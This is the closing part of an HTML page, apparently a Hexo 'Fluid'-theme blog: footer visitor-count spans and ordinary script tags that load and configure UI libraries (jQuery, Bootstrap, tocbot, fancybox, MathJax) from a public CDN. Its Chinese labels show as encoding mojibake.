        <span id="leancloud-site-pv"></span>
         Ê¨°
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        ÊÄªËÆøÂÆ¢Êï∞ 
        <span id="leancloud-site-uv"></span>
         ‰∫∫
      </span>
    
    

  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":true,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      collapseDepth   : CONFIG.toc.collapseDepth || 0,
      scrollSmooth    : true,
      headingsOffset  : -boardTop
    });
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  
      <script>
        if (!window.MathJax) {
          window.MathJax = {
            tex    : {
              inlineMath: { '[+]': [['$', '$']] }
            },
            loader : {
              load: ['ui/lazy']
            },
            options: {
              renderActions: {
                insertedScript: [200, () => {
                  document.querySelectorAll('mjx-container').forEach(node => {
                    let target = node.parentNode;
                    if (target.nodeName.toLowerCase() === 'li') {
                      target.parentNode.classList.add('has-jax');
                    }
                  });
                }, '', false]
              }
            }
          };
        } else {
          MathJax.startup.document.state(0);
          MathJax.texReset();
          MathJax.typeset();
          MathJax.typesetPromise();
        }
      </script>
    

  <script  src="https://lib.baomitu.com/mathjax/3.2.1/es5/tex-mml-chtml.js" ></script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>





<!-- ‰∏ªÈ¢òÁöÑÂêØÂä®È°πÔºåÂ∞ÜÂÆÉ‰øùÊåÅÂú®ÊúÄÂ∫ïÈÉ® -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">ÂçöÂÆ¢Âú®ÂÖÅËÆ∏ JavaScript ËøêË°åÁöÑÁéØÂ¢É‰∏ãÊµèËßàÊïàÊûúÊõ¥‰Ω≥</div>
  </noscript>
</body>
</html>
